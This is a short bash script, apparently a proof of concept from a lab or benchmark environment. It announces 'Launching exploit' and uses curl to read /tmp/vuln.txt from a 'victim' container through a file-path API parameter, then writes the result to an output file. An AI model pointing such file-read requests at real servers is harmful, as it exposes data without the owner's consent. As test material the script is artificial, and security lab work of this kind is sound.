#!/bin/bash
echo "Launching exploit"

TEMP_FILE=$(mktemp)  # Use a temporary file to store the response
curl -s "http://victim:5003/api/file?path=/tmp/vuln.txt" -o "$TEMP_FILE"

# Check if the request was successful
if [ $? -eq 0 ]; then
    # Check if the response contains "error" (from the victim container)
    if ! grep -q "error" "$TEMP_FILE"; then
        mv "$TEMP_FILE" ../output.txt
        chmod 644 ../output.txt
        echo "Found file: $(cat ../output.txt)"
    else
        echo "Error in response: $(cat "$TEMP_FILE")"
        rm "$TEMP_FILE"
        exit 1
    fi
else
    echo "[!] ERROR: Failed to connect to victim container"
    rm "$TEMP_FILE"
    exit 1
fi